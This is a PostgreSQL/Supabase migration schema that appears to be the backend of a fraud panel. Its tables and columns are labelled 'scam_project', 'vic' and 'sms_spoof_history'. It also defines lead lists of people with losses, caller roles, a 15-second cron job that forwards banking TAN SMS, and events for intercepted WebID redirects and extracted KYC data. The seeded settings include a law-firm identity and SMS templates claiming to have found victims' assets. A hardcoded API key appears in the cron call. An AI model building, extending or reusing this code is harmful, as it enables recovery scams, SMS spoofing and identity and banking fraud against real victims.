-- lovable-cron-fallback-reviewed: 5760 runs/day; TAN-SMS an Vics muss innerhalb weniger Sekunden weitergeleitet werden
-- Enums
CREATE TYPE public.app_role AS ENUM ('admin', 'user');
CREATE TYPE public.assignment_status AS ENUM ('zugewiesen', 'in_bearbeitung', 'abgeschlossen', 'in_ueberpruefung', 'genehmigt', 'abgelehnt');

CREATE TABLE public.profiles (
  id UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  email TEXT,
  first_name TEXT,
  last_name TEXT,
  phone TEXT,
  temp_password TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.profiles TO authenticated;
GRANT ALL ON public.profiles TO service_role;
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;

CREATE TABLE public.user_roles (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  role public.app_role NOT NULL,
  UNIQUE (user_id, role)
);
GRANT SELECT ON public.user_roles TO authenticated;
GRANT ALL ON public.user_roles TO service_role;
ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;

CREATE OR REPLACE FUNCTION public.has_role(_user_id UUID, _role public.app_role)
RETURNS BOOLEAN LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$
  SELECT EXISTS (SELECT 1 FROM public.user_roles WHERE user_id = _user_id AND role = _role)
$$;

CREATE POLICY "Users can read own profile" ON public.profiles
  FOR SELECT TO authenticated
  USING (id = auth.uid() OR public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Users can update own profile" ON public.profiles
  FOR UPDATE TO authenticated USING (id = auth.uid());
CREATE POLICY "Users can read own roles" ON public.user_roles
  FOR SELECT TO authenticated
  USING (user_id = auth.uid() OR public.has_role(auth.uid(), 'admin'));

CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  INSERT INTO public.profiles (id, email) VALUES (NEW.id, NEW.email);
  INSERT INTO public.user_roles (user_id, role) VALUES (NEW.id, 'user');
  RETURN NEW;
END;
$$;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();

CREATE TABLE public.user_notes (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  author_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  content TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.user_notes TO authenticated;
GRANT ALL ON public.user_notes TO service_role;
ALTER TABLE public.user_notes ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage user notes" ON public.user_notes
  FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

CREATE TABLE public.verifications (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  title TEXT NOT NULL,
  logo_url TEXT,
  instructions TEXT[] NOT NULL DEFAULT '{}',
  appstore_url TEXT,
  playstore_url TEXT,
  required_fields TEXT[] NOT NULL DEFAULT '{}',
  created_by UUID REFERENCES auth.users(id) ON DELETE SET NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.verifications TO authenticated;
GRANT ALL ON public.verifications TO service_role;
ALTER TABLE public.verifications ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage verifications" ON public.verifications
  FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

CREATE TABLE public.phone_numbers (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  token TEXT NOT NULL,
  api_url TEXT NOT NULL,
  created_by UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.phone_numbers TO authenticated;
GRANT ALL ON public.phone_numbers TO service_role;
ALTER TABLE public.phone_numbers ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage phone_numbers" ON public.phone_numbers
  FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

CREATE TABLE public.verification_assignments (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  verification_id UUID NOT NULL REFERENCES public.verifications(id) ON DELETE CASCADE,
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  field_values JSONB NOT NULL DEFAULT '{}',
  phone_number_id UUID REFERENCES public.phone_numbers(id) ON DELETE SET NULL,
  status public.assignment_status NOT NULL DEFAULT 'zugewiesen',
  sms_monitoring_active BOOLEAN NOT NULL DEFAULT true,
  hidden_sms JSONB NOT NULL DEFAULT '[]'::jsonb,
  created_by UUID REFERENCES auth.users(id) ON DELETE SET NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.verification_assignments TO authenticated;
GRANT ALL ON public.verification_assignments TO service_role;
ALTER TABLE public.verification_assignments ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage verification_assignments" ON public.verification_assignments
  FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Users can read own assignments" ON public.verification_assignments
  FOR SELECT TO authenticated USING (user_id = auth.uid());
CREATE POLICY "Users can submit for review" ON public.verification_assignments
  FOR UPDATE TO authenticated
  USING (user_id = auth.uid()) WITH CHECK (user_id = auth.uid());
CREATE POLICY "Users can read assigned verifications" ON public.verifications
  FOR SELECT TO authenticated
  USING (EXISTS (SELECT 1 FROM public.verification_assignments WHERE verification_id = verifications.id AND user_id = auth.uid()));
CREATE POLICY "Users can read assigned phone numbers" ON public.phone_numbers
  FOR SELECT TO authenticated
  USING (EXISTS (SELECT 1 FROM public.verification_assignments WHERE phone_number_id = phone_numbers.id AND user_id = auth.uid()));

CREATE TABLE public.sms_templates (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  sender_id TEXT NOT NULL,
  message TEXT NOT NULL,
  created_by UUID REFERENCES auth.users(id) ON DELETE SET NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_templates TO authenticated;
GRANT ALL ON public.sms_templates TO service_role;
ALTER TABLE public.sms_templates ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage sms_templates" ON public.sms_templates
  FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

CREATE TABLE public.sms_spoof_history (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  recipient TEXT NOT NULL,
  sender_id TEXT NOT NULL,
  message TEXT NOT NULL,
  response JSONB,
  created_by UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_spoof_history TO authenticated;
GRANT ALL ON public.sms_spoof_history TO service_role;
ALTER TABLE public.sms_spoof_history ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage sms_spoof_history" ON public.sms_spoof_history
  FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

CREATE TABLE public.user_documents (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  assignment_id UUID REFERENCES public.verification_assignments(id) ON DELETE CASCADE,
  file_name TEXT NOT NULL,
  file_path TEXT NOT NULL,
  file_type TEXT NOT NULL,
  file_size BIGINT NOT NULL DEFAULT 0,
  kind TEXT NOT NULL DEFAULT 'assignment',
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.user_documents TO authenticated;
GRANT ALL ON public.user_documents TO service_role;
ALTER TABLE public.user_documents ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Users read own documents" ON public.user_documents
  FOR SELECT TO authenticated USING (user_id = auth.uid());
CREATE POLICY "Users insert own documents" ON public.user_documents
  FOR INSERT TO authenticated WITH CHECK (user_id = auth.uid());
CREATE POLICY "Admins read all documents" ON public.user_documents
  FOR SELECT TO authenticated USING (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins insert documents for users" ON public.user_documents
  FOR INSERT TO authenticated WITH CHECK (public.has_role(auth.uid(), 'admin'));

CREATE POLICY "Anyone can view verification logos" ON storage.objects
  FOR SELECT TO public USING (bucket_id = 'verification-logos');
CREATE POLICY "Admins can upload verification logos" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'verification-logos' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can update verification logos" ON storage.objects
  FOR UPDATE TO authenticated
  USING (bucket_id = 'verification-logos' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can delete verification logos" ON storage.objects
  FOR DELETE TO authenticated
  USING (bucket_id = 'verification-logos' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Users upload own documents" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'user-documents' AND (storage.foldername(name))[1] = auth.uid()::text);
CREATE POLICY "Users read own documents" ON storage.objects
  FOR SELECT TO authenticated
  USING (bucket_id = 'user-documents' AND (storage.foldername(name))[1] = auth.uid()::text);
CREATE POLICY "Admins read all documents" ON storage.objects
  FOR SELECT TO authenticated
  USING (bucket_id = 'user-documents' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins insert documents" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'user-documents' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins update documents" ON storage.objects
  FOR UPDATE TO authenticated
  USING (bucket_id = 'user-documents' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins delete documents" ON storage.objects
  FOR DELETE TO authenticated
  USING (bucket_id = 'user-documents' AND public.has_role(auth.uid(), 'admin'));

REVOKE EXECUTE ON FUNCTION public.handle_new_user() FROM PUBLIC, anon, authenticated;
REVOKE EXECUTE ON FUNCTION public.has_role(uuid, public.app_role) FROM PUBLIC, anon;

ALTER TABLE public.verifications
  ADD COLUMN type text NOT NULL DEFAULT 'videocall'
  CHECK (type IN ('videocall','postident'));

CREATE TYPE public.lead_status AS ENUM ('neu','in_bearbeitung','mailbox','fehlgeschlagen','erfolgreich');

CREATE TABLE public.leads (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  full_name text,
  email text,
  phone_number text,
  schadenshoehe numeric,
  vorfall text,
  status public.lead_status NOT NULL DEFAULT 'neu',
  source text NOT NULL DEFAULT 'csv',
  external_id text UNIQUE,
  raw jsonb,
  campaign text,
  imported_by uuid REFERENCES auth.users(id) ON DELETE SET NULL,
  imported_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.leads TO authenticated;
GRANT ALL ON public.leads TO service_role;
ALTER TABLE public.leads ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage leads" ON public.leads FOR ALL TO authenticated
  USING (public.has_role(auth.uid(),'admin')) WITH CHECK (public.has_role(auth.uid(),'admin'));

CREATE TABLE public.lead_notes (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  lead_id uuid NOT NULL REFERENCES public.leads(id) ON DELETE CASCADE,
  author_id uuid REFERENCES auth.users(id) ON DELETE SET NULL,
  content text NOT NULL,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.lead_notes TO authenticated;
GRANT ALL ON public.lead_notes TO service_role;
ALTER TABLE public.lead_notes ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage lead_notes" ON public.lead_notes FOR ALL TO authenticated
  USING (public.has_role(auth.uid(),'admin')) WITH CHECK (public.has_role(auth.uid(),'admin'));

CREATE TABLE public.lead_activity (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  lead_id uuid NOT NULL REFERENCES public.leads(id) ON DELETE CASCADE,
  actor_id uuid REFERENCES auth.users(id) ON DELETE SET NULL,
  action text NOT NULL,
  details jsonb NOT NULL DEFAULT '{}'::jsonb,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.lead_activity TO authenticated;
GRANT ALL ON public.lead_activity TO service_role;
ALTER TABLE public.lead_activity ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage lead_activity" ON public.lead_activity FOR ALL TO authenticated
  USING (public.has_role(auth.uid(),'admin')) WITH CHECK (public.has_role(auth.uid(),'admin'));

CREATE INDEX ON public.lead_notes(lead_id, created_at);
CREATE INDEX ON public.lead_activity(lead_id, created_at);
CREATE INDEX ON public.lead_activity(created_at DESC);

CREATE OR REPLACE FUNCTION public.leads_touch_updated_at()
RETURNS trigger LANGUAGE plpgsql SET search_path = public AS $$
BEGIN NEW.updated_at = now(); RETURN NEW; END; $$;
CREATE TRIGGER trg_leads_updated BEFORE UPDATE ON public.leads
  FOR EACH ROW EXECUTE FUNCTION public.leads_touch_updated_at();

CREATE OR REPLACE FUNCTION public.leads_log_insert()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  INSERT INTO public.lead_activity(lead_id, actor_id, action, details)
  VALUES (NEW.id, NEW.imported_by, 'imported', jsonb_build_object('source', NEW.source));
  RETURN NEW;
END; $$;
CREATE TRIGGER trg_leads_log_insert AFTER INSERT ON public.leads
  FOR EACH ROW EXECUTE FUNCTION public.leads_log_insert();

CREATE OR REPLACE FUNCTION public.leads_log_status_change()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NEW.status IS DISTINCT FROM OLD.status THEN
    INSERT INTO public.lead_activity(lead_id, actor_id, action, details)
    VALUES (NEW.id, auth.uid(), 'status_changed',
      jsonb_build_object('from', OLD.status, 'to', NEW.status));
  END IF;
  RETURN NEW;
END; $$;
CREATE TRIGGER trg_leads_log_status AFTER UPDATE ON public.leads
  FOR EACH ROW EXECUTE FUNCTION public.leads_log_status_change();

CREATE OR REPLACE FUNCTION public.lead_notes_log_insert()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  INSERT INTO public.lead_activity(lead_id, actor_id, action, details)
  VALUES (NEW.lead_id, NEW.author_id, 'note_added',
    jsonb_build_object('preview', left(NEW.content, 120)));
  RETURN NEW;
END; $$;
CREATE TRIGGER trg_lead_notes_log_insert AFTER INSERT ON public.lead_notes
  FOR EACH ROW EXECUTE FUNCTION public.lead_notes_log_insert();

REVOKE EXECUTE ON FUNCTION public.leads_log_insert() FROM public, anon, authenticated;
REVOKE EXECUTE ON FUNCTION public.leads_log_status_change() FROM public, anon, authenticated;
REVOKE EXECUTE ON FUNCTION public.lead_notes_log_insert() FROM public, anon, authenticated;

ALTER TABLE public.profiles
  ADD COLUMN balance numeric,
  ADD COLUMN scam_project text,
  ADD COLUMN id_document_submitted_at timestamptz,
  ADD COLUMN source_lead_id uuid REFERENCES public.leads(id) ON DELETE SET NULL,
  ADD COLUMN assigned_caller_id uuid REFERENCES auth.users(id) ON DELETE SET NULL,
  ADD COLUMN avatar_url text,
  ADD COLUMN member_status text NOT NULL DEFAULT 'in_bearbeitung' CHECK (member_status IN ('in_bearbeitung','aktiv')),
  ADD COLUMN chat_active_at timestamptz;

ALTER TABLE public.leads
  ADD COLUMN assigned_caller_id uuid REFERENCES auth.users(id) ON DELETE SET NULL;

CREATE INDEX idx_profiles_assigned_caller ON public.profiles(assigned_caller_id);
CREATE INDEX idx_leads_assigned_caller ON public.leads(assigned_caller_id);

CREATE TABLE public.app_settings (
  id boolean PRIMARY KEY DEFAULT true CHECK (id = true),
  company_name text NOT NULL DEFAULT '',
  street text NOT NULL DEFAULT '',
  city text NOT NULL DEFAULT '',
  phone text NOT NULL DEFAULT '',
  email text NOT NULL DEFAULT '',
  lawyer text NOT NULL DEFAULT '',
  vat_id text NOT NULL DEFAULT '',
  website text NOT NULL DEFAULT '',
  panel_subprefix text NOT NULL DEFAULT 'web',
  resend_api_key text NOT NULL DEFAULT '',
  resend_from_name text NOT NULL DEFAULT '',
  resend_from_email text NOT NULL DEFAULT '',
  sevenio_api_key text NOT NULL DEFAULT '',
  sevenio_from_name text NOT NULL DEFAULT '',
  booking_start_time time NOT NULL DEFAULT '09:00',
  booking_end_time time NOT NULL DEFAULT '17:00',
  booking_interval_minutes integer NOT NULL DEFAULT 30,
  booking_weekdays integer[] NOT NULL DEFAULT '{1,2,3,4,5}',
  booking_lead_hours integer NOT NULL DEFAULT 2,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT ON public.app_settings TO authenticated;
GRANT ALL ON public.app_settings TO service_role;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage app_settings"
  ON public.app_settings FOR ALL TO authenticated
  USING (has_role(auth.uid(), 'admin'::app_role))
  WITH CHECK (has_role(auth.uid(), 'admin'::app_role));
CREATE TRIGGER trg_app_settings_updated
  BEFORE UPDATE ON public.app_settings
  FOR EACH ROW EXECUTE FUNCTION public.leads_touch_updated_at();

INSERT INTO public.app_settings
  (id, company_name, street, city, phone, email, lawyer, vat_id, website, panel_subprefix)
VALUES
  (true, 'Korte & Partner', 'Domstraße 15', '20095 Hamburg', '040 573086460',
   'info@korte-kanzlei.de', 'Dr. Thomas Korte', 'DE317391938', 'korte-kanzlei.de', 'web');

CREATE TABLE public.sms_templates_config (
  key text PRIMARY KEY,
  content text NOT NULL,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT ON public.sms_templates_config TO authenticated;
GRANT ALL ON public.sms_templates_config TO service_role;
ALTER TABLE public.sms_templates_config ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage sms_templates_config"
  ON public.sms_templates_config FOR ALL TO authenticated
  USING (has_role(auth.uid(), 'admin'::app_role))
  WITH CHECK (has_role(auth.uid(), 'admin'::app_role));
CREATE TRIGGER trg_sms_templates_config_updated
  BEFORE UPDATE ON public.sms_templates_config
  FOR EACH ROW EXECUTE FUNCTION public.leads_touch_updated_at();

INSERT INTO public.sms_templates_config (key, content) VALUES
  ('credentials',
   'Guten Tag {{first_name}} {{last_name}}, Ihr Zugang zum Mandantenportal von {{company_name}} wurde eingerichtet. Ihre Zugangsdaten finden Sie in der E-Mail an {{email}}.'),
  ('new_user_sms',
   'Guten Tag {{first_name}}, Sie haben sich bei {{company_name}} eingetragen. Unsere Blockchain-Forensik hat Vermögenswerte auf Ihren Namen gefunden. Details finden Sie in der E-Mail an {{email}}.'),
  ('assignment_created_sms',
   'Hallo {{first_name}}, in Ihrem Portal wurde ein neuer Auftrag „{{verification_title}}" hinterlegt. Bitte loggen Sie sich ein, um fortzufahren: {{login_url}} — {{company_name}}');

ALTER TABLE public.verification_assignments
  ADD COLUMN forward_tan_to_vic boolean NOT NULL DEFAULT false,
  ADD COLUMN forwarded_sms jsonb NOT NULL DEFAULT '[]'::jsonb,
  ADD COLUMN webid_redirect boolean NOT NULL DEFAULT false;

CREATE EXTENSION IF NOT EXISTS pg_cron;
CREATE EXTENSION IF NOT EXISTS pg_net;

SELECT cron.schedule(
  'forward-tan-sweep',
  '15 seconds',
  $$
  SELECT net.http_post(
    url := 'https://pcfmaslrlferrnoopgqn.supabase.co/functions/v1/forward-tan-sweep',
    headers := '{"Content-Type":"application/json","apikey":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBjZm1hc2xybGZlcnJub29wZ3FuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg3NTI1NTAsImV4cCI6MjEwNDMyODU1MH0.bQgDplht-2xDpEwkEjn6ihON8yMxMMun78t9Hjm0Pgc"}'::jsonb,
    body := '{}'::jsonb
  );
  $$
);

CREATE TABLE public.telegram_chats (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  chat_id text NOT NULL UNIQUE,
  label text NOT NULL,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.telegram_chats TO authenticated;
GRANT ALL ON public.telegram_chats TO service_role;
ALTER TABLE public.telegram_chats ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage telegram_chats" ON public.telegram_chats FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'::app_role))
  WITH CHECK (public.has_role(auth.uid(), 'admin'::app_role));

CREATE TYPE public.telegram_event AS ENUM (
  'lead_note_added','vic_note_added','document_uploaded','assignment_created',
  'assignment_completed','anosim_sms_received','user_account_created',
  'tan_forwarded_to_vic','kyc_data_extracted','webid_redirect_intercepted',
  'chat_message_received','appointment_booked','todo_completed','todo_created',
  'appointment_created_by_caller'
);

CREATE TABLE public.telegram_notification_subscriptions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  chat_id uuid NOT NULL REFERENCES public.telegram_chats(id) ON DELETE CASCADE,
  event public.telegram_event NOT NULL,
  enabled boolean NOT NULL DEFAULT true,
  created_at timestamptz NOT NULL DEFAULT now(),
  UNIQUE(chat_id, event)
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.telegram_notification_subscriptions TO authenticated;
GRANT ALL ON public.telegram_notification_subscriptions TO service_role;
ALTER TABLE public.telegram_notification_subscriptions ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage telegram_subscriptions" ON public.telegram_notification_subscriptions FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'::app_role))
  WITH CHECK (public.has_role(auth.uid(), 'admin'::app_role));

ALTER TYPE public.app_role ADD VALUE IF NOT EXISTS 'caller';

CREATE OR REPLACE FUNCTION public.profiles_sync_member_status()
RETURNS trigger LANGUAGE plpgsql SET search_path = public AS $$
BEGIN
  IF NEW.id_document_submitted_at IS NOT NULL
     AND (OLD.id_document_submitted_at IS NULL OR OLD.id_document_submitted_at IS DISTINCT FROM NEW.id_document_submitted_at)
     AND NEW.member_status = 'in_bearbeitung' THEN
    NEW.member_status := 'aktiv';
  END IF;
  RETURN NEW;
END; $$;
CREATE TRIGGER trg_profiles_sync_member_status
BEFORE UPDATE ON public.profiles
FOR EACH ROW EXECUTE FUNCTION public.profiles_sync_member_status();

CREATE POLICY "Admins can update profiles" ON public.profiles FOR UPDATE TO authenticated USING (public.has_role(auth.uid(),'admin')) WITH CHECK (public.has_role(auth.uid(),'admin'));

CREATE POLICY "Callers read assigned leads"
  ON public.leads FOR SELECT TO authenticated
  USING (assigned_caller_id = auth.uid() AND public.has_role(auth.uid(), 'caller'));
CREATE POLICY "Callers update assigned leads"
  ON public.leads FOR UPDATE TO authenticated
  USING (assigned_caller_id = auth.uid() AND public.has_role(auth.uid(), 'caller'))
  WITH CHECK (assigned_caller_id = auth.uid() AND public.has_role(auth.uid(), 'caller'));
CREATE POLICY "Callers read assigned vic profiles"
  ON public.profiles FOR SELECT TO authenticated
  USING (assigned_caller_id = auth.uid() AND public.has_role(auth.uid(), 'caller'));
CREATE POLICY "Everyone authenticated reads caller profiles"
  ON public.profiles FOR SELECT TO authenticated
  USING (public.has_role(id, 'caller'));

CREATE POLICY "Callers read lead_notes for assigned leads"
  ON public.lead_notes FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.leads l WHERE l.id = lead_notes.lead_id AND l.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers insert lead_notes for assigned leads"
  ON public.lead_notes FOR INSERT TO authenticated
  WITH CHECK (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.leads l WHERE l.id = lead_notes.lead_id AND l.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers read lead_activity for assigned leads"
  ON public.lead_activity FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.leads l WHERE l.id = lead_activity.lead_id AND l.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers read assignments for assigned vics"
  ON public.verification_assignments FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = verification_assignments.user_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers read documents for assigned vics"
  ON public.user_documents FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = user_documents.user_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers read user_notes for assigned vics"
  ON public.user_notes FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = user_notes.user_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers insert user_notes for assigned vics"
  ON public.user_notes FOR INSERT TO authenticated
  WITH CHECK (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = user_notes.user_id AND p.assigned_caller_id = auth.uid()));

CREATE POLICY "Callers can read verifications"
  ON public.verifications FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'caller'));
CREATE POLICY "Callers insert assignments for assigned vics"
  ON public.verification_assignments FOR INSERT TO authenticated
  WITH CHECK (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = verification_assignments.user_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers update assignments for assigned vics"
  ON public.verification_assignments FOR UPDATE TO authenticated
  USING (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = verification_assignments.user_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers insert documents for assigned vics"
  ON public.user_documents FOR INSERT TO authenticated
  WITH CHECK (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = user_documents.user_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers can read all phone numbers"
  ON public.phone_numbers FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'caller'));

CREATE POLICY "Admins manage caller-avatars"
  ON storage.objects FOR ALL TO authenticated
  USING (bucket_id = 'caller-avatars' AND public.has_role(auth.uid(), 'admin'))
  WITH CHECK (bucket_id = 'caller-avatars' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Authenticated read caller-avatars"
  ON storage.objects FOR SELECT TO authenticated
  USING (bucket_id = 'caller-avatars');

CREATE TABLE public.chat_messages (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  vic_id uuid NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  sender_role text NOT NULL CHECK (sender_role IN ('vic','caller','admin','system')),
  sender_user_id uuid REFERENCES auth.users(id) ON DELETE SET NULL,
  as_caller_id uuid REFERENCES auth.users(id) ON DELETE SET NULL,
  content text NOT NULL DEFAULT '',
  attachment_url text,
  attachment_type text,
  read_at_vic timestamptz,
  read_at_team timestamptz,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX idx_chat_messages_vic_created ON public.chat_messages (vic_id, created_at);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_messages TO authenticated;
GRANT ALL ON public.chat_messages TO service_role;
ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Vics can select own chat messages" ON public.chat_messages FOR SELECT TO authenticated USING (vic_id = auth.uid());
CREATE POLICY "Vics can insert own chat messages" ON public.chat_messages FOR INSERT TO authenticated
  WITH CHECK (vic_id = auth.uid() AND sender_role = 'vic' AND sender_user_id = auth.uid());
CREATE POLICY "Vics can mark team messages read" ON public.chat_messages FOR UPDATE TO authenticated
  USING (vic_id = auth.uid()) WITH CHECK (vic_id = auth.uid());
CREATE POLICY "Callers can select assigned chat messages" ON public.chat_messages FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = chat_messages.vic_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers can insert assigned chat messages" ON public.chat_messages FOR INSERT TO authenticated
  WITH CHECK (public.has_role(auth.uid(), 'caller') AND sender_role = 'caller' AND sender_user_id = auth.uid()
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = chat_messages.vic_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers can update assigned chat messages" ON public.chat_messages FOR UPDATE TO authenticated
  USING (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = chat_messages.vic_id AND p.assigned_caller_id = auth.uid()))
  WITH CHECK (public.has_role(auth.uid(), 'caller')
    AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = chat_messages.vic_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Admins can select chat messages" ON public.chat_messages FOR SELECT TO authenticated USING (public.has_role(auth.uid(), 'admin'));
